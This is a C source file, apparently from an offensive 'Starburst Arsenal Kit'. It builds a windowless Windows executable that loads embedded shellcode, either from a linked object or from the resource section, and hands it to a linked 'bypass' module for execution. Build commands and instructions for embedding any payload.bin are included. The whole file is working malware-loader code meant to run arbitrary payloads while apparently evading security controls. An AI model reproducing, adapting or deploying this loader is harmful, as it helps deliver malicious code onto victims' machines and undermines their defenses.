/*
 * Starburst Arsenal Kit - EXE Wrapper
 *
 * Standard Windows executable wrapper that loads embedded shellcode
 * and executes it via the linked bypass technique.
 *
 * Build (MinGW):
 *   x86_64-w64-mingw32-gcc -O2 -s -o starburst.exe \
 *       src/main_exe.c bypass/bypass_pipe.c shellcode.o \
 *       -lkernel32 -luser32 -ladvapi32 -Wl,--subsystem,windows -mwindows
 *
 * Build (MSVC):
 *   cl /O2 src/main_exe.c bypass/bypass_pipe.c shellcode.obj \
 *       /link /SUBSYSTEM:WINDOWS kernel32.lib user32.lib advapi32.lib
 *
 * Shellcode source (choose one):
 *   1. Link a shellcode object file exporting shellcode[] and shellcode_len
 *   2. Define SHELLCODE_FROM_RSRC to load from the .rsrc section instead
 */

#include <windows.h>

/* --------------------------------------------------------------------
 * Bypass interface -- implemented by whichever bypass module is linked
 * ------------------------------------------------------------------ */
extern void execute_shellcode(unsigned char *shellcode, unsigned int shellcode_len);

/* --------------------------------------------------------------------
 * Option 1: Shellcode linked as an object file
 * Generate with:  xxd -i payload.bin > shellcode.c
 * Rename symbols to shellcode / shellcode_len, then compile to .o
 * ------------------------------------------------------------------ */
#ifndef SHELLCODE_FROM_RSRC
extern unsigned char  shellcode[];
extern unsigned int   shellcode_len;
#endif

/* --------------------------------------------------------------------
 * Option 2: Shellcode embedded in the resource section
 * Define SHELLCODE_FROM_RSRC and set the resource ID / type below.
 * Add to resource.rc:
 *   IDR_SHELLCODE RCDATA "payload.bin"
 * ------------------------------------------------------------------ */
#ifdef SHELLCODE_FROM_RSRC
#define IDR_SHELLCODE  101
#define RT_RCDATA_STR  "RCDATA"

static int load_shellcode_from_rsrc(unsigned char **out_buf, unsigned int *out_len)
{
    HRSRC   hRes;
    HGLOBAL hGlobal;
    LPVOID  pData;
    DWORD   dwSize;

    hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_SHELLCODE), RT_RCDATA_STR);
    if (!hRes)
        return -1;

    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal)
        return -1;

    pData  = LockResource(hGlobal);
    dwSize = SizeofResource(NULL, hRes);
    if (!pData || dwSize == 0)
        return -1;

    *out_buf = (unsigned char *)pData;
    *out_len = (unsigned int)dwSize;
    return 0;
}
#endif /* SHELLCODE_FROM_RSRC */

/* --------------------------------------------------------------------
 * Entry point
 * ------------------------------------------------------------------ */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    unsigned char *sc_buf  = NULL;
    unsigned int   sc_len  = 0;

    (void)hInstance;
    (void)hPrevInstance;
    (void)lpCmdLine;
    (void)nCmdShow;

#ifdef SHELLCODE_FROM_RSRC
    if (load_shellcode_from_rsrc(&sc_buf, &sc_len) != 0)
        return 1;
#else
    sc_buf = shellcode;
    sc_len = shellcode_len;
#endif

    if (sc_buf == NULL || sc_len == 0)
        return 1;

    /* Hand off to the bypass technique for execution */
    execute_shellcode(sc_buf, sc_len);

    return 0;
}
